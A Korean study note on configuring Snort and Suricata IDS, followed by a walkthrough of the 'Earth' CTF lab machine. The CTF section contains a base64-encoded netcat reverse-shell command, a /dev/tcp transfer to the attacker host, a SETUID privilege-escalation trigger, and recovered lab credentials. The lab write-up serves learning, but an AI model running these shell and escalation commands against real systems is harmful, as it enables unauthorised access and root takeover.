# 🛡️ Network Security & CTF 실습 노트

## 📅 학습 내용 요약
- Snort IDS 설정 및 룰 작성
- Suricata IDS 설치 및 운영
- CTF Earth 머신 침투 실습 (정보수집 → 취약점 분석 → 권한 상승)

---

## 1. Snort IDS

### 기본 명령어

```bash
# Snort 상태 확인
sudo systemctl status snort

# 룰 파일 편집
sudo vi /usr/local/etc/snort/rules/local.rules

# 룰 디렉토리 이동
cd /usr/local/etc/snort/rules

# Snort 탐지 시작
sudo snort -c /usr/local/etc/snort/snort.lua \
           -R /usr/local/etc/snort/rules/local.rules \
           -i enp0s3 \
           -A alert_fast \
           -s 65535 \
           -k none
```

> ⚠️ Snort는 **IDS(탐지 전용)** 이므로 `drop` 룰을 써도 실제 차단은 되지 않음

### Apache & 방화벽

```bash
# Apache 상태 확인
sudo systemctl status apache2

# 방화벽 규칙 확인
sudo firewall-cmd --list-all

# 80 포트 영구 허용
sudo firewall-cmd --permanent --add-port=80/tcp

# 방화벽 재로드
sudo firewall-cmd --reload
```

### Snort 룰 예시

```
# ICMP Ping 탐지
alert icmp any any -> any any (msg:"icmp Ping"; sid:1000001; rev:1;)

# 특정 IP에서 웹서버로 /etc/passwd 접근 탐지
alert tcp 172.16.11.213 any -> 172.16.11.235 80 (msg:"Web Hack"; sid:1000002; rev:1; content:"/etc/passwd";)

# ❌ IDS라서 drop은 실제로 차단 안 됨 (참고용)
# drop tcp 172.16.11.213 any -> 172.16.11.235 80 (msg:"Web Hack"; sid:1000002; rev:1;)
```

---

## 2. Suricata IDS

### 설치

```bash
# EPEL 저장소 및 Suricata 설치
dnf install -y epel-release
dnf update -y
dnf install -y suricata

# 버전 확인
suricata -V

# RPM 락 걸렸을 때
sudo rm -f /var/lib/rpm/.rpm.lock
```

### 네트워크 인터페이스 설정

```bash
# Promiscuous 모드 켜기 (모든 패킷 수신)
sudo ifconfig enp0s3 promisc

# Promiscuous 모드 끄기
sudo ifconfig enp0s3 -promisc
```

### 주요 설정 파일

```bash
# Suricata 동작 설정 (메인 설정 파일)
vi /etc/suricata/suricata.yaml

# Suricata 서비스 옵션 설정
vi /etc/sysconfig/suricata

# 커스텀 룰 작성 위치
vi /etc/suricata/rules/local.rules
```

### 서비스 관리

```bash
# 서비스 상태 확인
systemctl status suricata

# 시작 + 부팅 시 자동 실행 등록
systemctl enable --now suricata

# 재시작
systemctl restart suricata
```

### 룰 업데이트

```bash
# 룰 업데이트
suricata-update

# 사용 가능한 소스 목록 확인
suricata-update list-sources

# ET/Open 룰셋 활성화
suricata-update enable-source et/open
```

### 로그 확인

```bash
# 로그 디렉토리 확인
ls /var/log/suricata/

# fast.log 실시간 모니터링
tail -f /var/log/suricata/fast.log

# JSON 형식의 상세 로그 (jq로 파싱 가능)
tail -f /var/log/suricata/eve.json

# jq 설치 (JSON 예쁘게 보기)
dnf install -y jq

# 룰 파일 확인
ls -al /var/lib/suricata/rules/
```

### 탐지 테스트

```bash
# 외부 테스트 사이트로 탐지 유발
curl http://testmynids.org/uid/index.html
```

### Suricata 룰 예시

```
# SSH 연결 시도 탐지 (Windows PuTTY → SSH)
alert tcp any any -> any 22 (msg:"SSH Connection Attempt Detected"; flags:S; sid:1000002; rev:1;)
```

---

## 3. CTF - Earth 머신 침투 실습

### 환경 정보

| 항목 | 내용 |
|------|------|
| 공격자 (Kali) | 172.16.11.213 |
| 타깃 (Earth) | 172.16.11.214 |
| 네트워크 | 172.16.11.0/24 (브릿지) |

### Step 1. 네트워크 정보 수집

```bash
# 네트워크 전체 호스트 스캔
sudo nmap -sn 172.16.11.0/24

# ARP 기반 호스트 발견
sudo netdiscover -r 172.16.11.0/24
sudo arp-scan -l

# 발견된 호스트 예시
# 172.16.11.201 - Intel Corporate
# 172.16.11.203 - Unknown
# 172.16.11.214 - Oracle VirtualBox (타깃)
# 172.16.11.213 - Kali (본인)
```

### Step 2. 포트 및 서비스 스캔

```bash
# 전체 포트 + 서비스 버전 스캔
sudo nmap -sV -v -p- 172.16.11.214

# 기본 스크립트 포함 스캔
sudo nmap -sV -v -sC 172.16.11.214
```

> 💡 80 포트 접속 시 Bad Request(400) → HTTPS 필요하거나 도메인 기반 가상호스트일 가능성

### Step 3. /etc/hosts 설정

```bash
sudo nano /etc/hosts
# 아래 줄 추가
172.16.11.214  earth.local
172.16.11.214  terratest.earth.local
```

### Step 4. 디렉토리 스캐닝

```bash
# dirb로 디렉토리 탐색
dirb https://earth.local
dirb https://terratest.earth.local

# robots.txt 확인 → 숨겨진 파일 발견 가능
# gobuster (더 빠른 디렉토리 스캐닝, -k = SSL 인증서 무시)
sudo gobuster dir \
  -u https://terratest.earth.local \
  -w /usr/share/wordlists/dirb/big.txt \
  -k

# dirbuster (GUI 기반, OWASP)
dirbuster http://172.16.11.214
```

### Step 5. 발견된 주요 경로 및 정보

| 경로 | 내용 |
|------|------|
| `/admin` | 관리자 로그인 페이지 |
| `/testingnotes.txt` | 테스트 관련 메모 |
| `/testdata.txt` | XOR 암호화 키 데이터 |

### Step 6. XOR 복호화 (CyberChef 활용)

1. `https://terratest.earth.local/testdata.txt` 내용 = **XOR 키**
2. `https://earth.local` 페이지에서 **가장 긴 암호화된 문자열** 복사
3. CyberChef에서 `XOR` 연산으로 복호화

```
발견된 계정 정보
ID: terra
PW: earthclimatechangebad4humans
```

### Step 7. 리버스 쉘 (Reverse Shell)

```bash
# 공격자 측에서 리스닝 시작 (먼저 실행!)
sudo nc -lvnp 4444

# 타깃에서 실행할 명령어를 Base64로 인코딩
echo 'nc -e /bin/bash 172.16.11.213 4444' | base64
# 출력 예: bmMgLWUgL2Jpbi9iYXNoIDE3Mi4xNi4xMS4yMTMgNDQ0NAo=

# 타깃의 웹쉘/커맨드 인젝션에 아래 명령어 입력
echo 'bmMgLWUgL2Jpbi9iYXNoIDE3Mi4xNi4xMS4yMTMgNDQ0NAo=' | base64 -d | bash
```

> ⚠️ 반드시 **nc 리스닝을 먼저** 실행한 상태에서 타깃에서 명령 실행

```bash
# 연결 후 인터랙티브 쉘 업그레이드
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 8. 권한 상승 (Privilege Escalation)

#### SETUID 파일 탐색

```bash
# SETUID 또는 SETGID 설정된 파일 찾기
find / -perm -u=s 2>/dev/null

# 특정 파일 권한 확인
ls -l /usr/bin/passwd

# 파일 타입 확인
file /usr/bin/reset_root
```

> 💡 **SETUID란?**
> 일반 유저가 root 소유의 SETUID 파일을 실행하면, 실행 순간만큼은 **root 권한으로 동작**
> → 모의해킹에서 가장 대표적인 권한 상승 기법

#### reset_root 파일 분석

```bash
# 공격자 측에서 파일 수신 대기
nc -lvnp 3333 > reset_root

# 타깃에서 파일 전송
cat /usr/bin/reset_root > /dev/tcp/172.16.11.213/3333

# 실행 권한 부여
sudo chmod +x reset_root

# ltrace 설치 (동적 라이브러리 호출 추적)
sudo apt update
sudo apt install -y ltrace

# ltrace로 reset_root 실행 흐름 분석
ltrace ./reset_root
```

#### reset_root 트리거 조건 (파일 생성)

```bash
# 분석 결과, 아래 3개 파일이 존재해야 실행됨
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe

# 이후 reset_root 실행 → root 권한 획득
reset_root
```

---

## 📌 핵심 개념 정리

| 개념 | 설명 |
|------|------|
| **IDS** | 침입 탐지 시스템. 탐지만 하고 차단 불가 (Snort, Suricata) |
| **IPS** | 침입 방지 시스템. 탐지 + 차단 가능 |
| **Promiscuous Mode** | 자신에게 오지 않은 패킷도 수신 (네트워크 전체 모니터링) |
| **SETUID** | 실행 시 파일 소유자 권한으로 동작 (권한 상승 주요 벡터) |
| **Reverse Shell** | 타깃이 공격자에게 연결을 맺는 쉘 (방화벽 우회에 유리) |
| **XOR 암호화** | 같은 키로 암호화/복호화 가능한 대칭 연산 |
